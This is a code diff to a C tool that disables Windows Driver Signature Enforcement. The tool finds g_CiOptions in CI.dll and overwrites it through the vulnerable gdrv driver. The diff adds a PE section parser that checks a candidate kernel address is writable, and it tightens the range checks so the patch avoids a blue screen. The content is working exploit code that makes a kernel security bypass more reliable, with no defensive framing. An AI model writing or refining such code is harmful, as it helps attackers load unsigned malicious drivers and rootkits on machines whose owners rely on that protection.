@@ -1090,6 +1090,46 @@ done:
 typedef struct{char name[9];ULONG vaddr;ULONG vsz;DWORD chars;} SECT_INFO;
 /* IMAGE_SCN_MEM_WRITE=0x80000000 — only candidates in writable sections are safe to patch */
 
+/* Returns TRUE if the given kernel VA falls within a writable (IMAGE_SCN_MEM_WRITE) section
+   of CI.dll as stored on disk.  Prevents accepting a code-section address from the precise
+   scan: gdrv's RtlCopyMemory write to a read-only page causes kernel #PF → BSOD 0x139. */
+static BOOL ci_kva_is_writable(UINT64 kva, UINT64 ci_base) {
+    if(!kva || !ci_base || kva < ci_base) return FALSE;
+    ULONG rva = (ULONG)(kva - ci_base);
+    char path[MAX_PATH]; GetSystemDirectoryA(path, sizeof(path));
+    strncat(path, "\\CI.dll", sizeof(path)-strlen(path)-1);
+    HANDLE hf = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_WRITE,
+                            NULL, OPEN_EXISTING, 0, NULL);
+    if(hf == INVALID_HANDLE_VALUE) return TRUE; /* can't verify — allow */
+    BYTE hdr[4096]; DWORD rd = 0;
+    ReadFile(hf, hdr, sizeof(hdr), &rd, NULL); CloseHandle(hf);
+    if(rd < 0x40) return FALSE;
+    DWORD peOff = *(DWORD*)(hdr + 0x3C);
+    if((SIZE_T)peOff + 0x18 + 4 > rd || *(DWORD*)(hdr + peOff) != 0x00004550) return FALSE;
+    WORD nsec = *(WORD*)(hdr + peOff + 6);
+    WORD optSz = *(WORD*)(hdr + peOff + 0x14);
+    BYTE *secHdr = hdr + peOff + 0x18 + optSz;
+    if((SIZE_T)(secHdr - hdr) + (SIZE_T)nsec * 40 > rd || nsec > 96) return FALSE;
+    for(WORD i = 0; i < nsec; i++) {
+        BYTE *s = secHdr + (SIZE_T)i * 40;
+        ULONG va  = *(DWORD*)(s + 12);
+        ULONG vsz = *(DWORD*)(s + 8);   /* VirtualSize */
+        ULONG raw = *(DWORD*)(s + 16);  /* SizeOfRawData */
+        ULONG sz  = vsz > raw ? vsz : raw;
+        DWORD ch  = *(DWORD*)(s + 36);
+        if(rva >= va && rva < va + sz) {
+            BOOL w = (ch & 0x80000000u) != 0;
+            logf("[*] ci_kva 0x%016llX RVA=0x%08lX sect %.8s chars=0x%08lX writable=%d",
+                 (unsigned long long)kva, (unsigned long)rva, (char*)s,
+                 (unsigned long)ch, (int)w);
+            return w;
+        }
+    }
+    logf("[!] ci_kva 0x%016llX RVA=0x%08lX not found in any section",
+         (unsigned long long)kva, (unsigned long)rva);
+    return FALSE;
+}
+
 static UINT64 get_ci_base(ULONG *out_vsz) {
     ULONG needed=0; void *buf=NULL; NTSTATUS st;
     do{needed+=0x10000;free(buf);buf=malloc(needed);if(!buf)return 0;
@@ -1379,10 +1419,12 @@ static BOOL patch_dse(UINT64 *out_kva,UINT64 *out_orig) {
             kva = 0;
         }
         if (kva) {
-            /* Layer 2: DWORD read — g_CiOptions DWORD value must be 0..63 */
+            /* Layer 2: DWORD read — g_CiOptions upper 3 bytes = 0, byte must be 0..0x0F.
+               Real values: 0x00 (disabled), 0x06 (enabled), 0x08 (WinLoad), 0x0E (boot+CI).
+               Tightening from 0x3F to 0x0F rejects code bytes (0x10+) that pass 0x3F check. */
             UINT64 cur = 0;
-            if (!kread(kva, 4, &cur) || cur > 0x3F) {
-                logf("[!] precise: kva=0x%016llX DWORD=0x%08llX — unexpected, discarding",
+            if (!kread(kva, 4, &cur) || cur > 0x0F) {
+                logf("[!] precise: kva=0x%016llX DWORD=0x%08llX — out of range, discarding",
                      (unsigned long long)kva, (unsigned long long)cur);
                 kva = 0;
             } else {
@@ -1394,8 +1436,17 @@ static BOOL patch_dse(UINT64 *out_kva,UINT64 *out_orig) {
                          (unsigned long long)kva, (unsigned long long)cur, (unsigned long long)cur2);
                     kva = 0;
                 } else {
-                    logf("[*] precise: kva=0x%016llX DWORD=0x%02llX stable — verified",
-                         (unsigned long long)kva, (unsigned long long)cur);
+                    /* Layer 4: writable section check — gdrv writes via RtlCopyMemory (no WP
+                       bypass on some versions); write to read-only .text page → kernel #PF → BSOD.
+                       Even with WP bypass, landing in a non-data section means wrong address. */
+                    if (!ci_kva_is_writable(kva, ci_base)) {
+                        logf("[!] precise: kva=0x%016llX not in writable CI.dll section — discarding",
+                             (unsigned long long)kva);
+                        kva = 0;
+                    } else {
+                        logf("[*] precise: kva=0x%016llX DWORD=0x%02llX stable writable — verified",
+                             (unsigned long long)kva, (unsigned long long)cur);
+                    }
                 }
             }
         }
@@ -1427,8 +1478,15 @@ static BOOL patch_dse(UINT64 *out_kva,UINT64 *out_orig) {
                              (unsigned long long)ci,(unsigned long long)cands[ci]);
                         continue;
                     }
+                    /* Writable section re-check (scan_ci_options already filters, but
+                       validate here too so the final accepted KVA is always confirmed) */
+                    if (!ci_kva_is_writable(cands[ci], ci_base)) {
+                        logf("[*] AOB cand[%lu]=0x%016llX not writable — skip",
+                             (unsigned long long)ci,(unsigned long long)cands[ci]);
+                        continue;
+                    }
                     kva=cands[ci];
-                    logf("[*] AOB cand[%lu]=0x%016llX DWORD=0x%02llX stable — verified",
+                    logf("[*] AOB cand[%lu]=0x%016llX DWORD=0x%02llX stable writable — verified",
                          (unsigned long long)ci,(unsigned long long)kva,(unsigned long long)cur);
                 }
             }
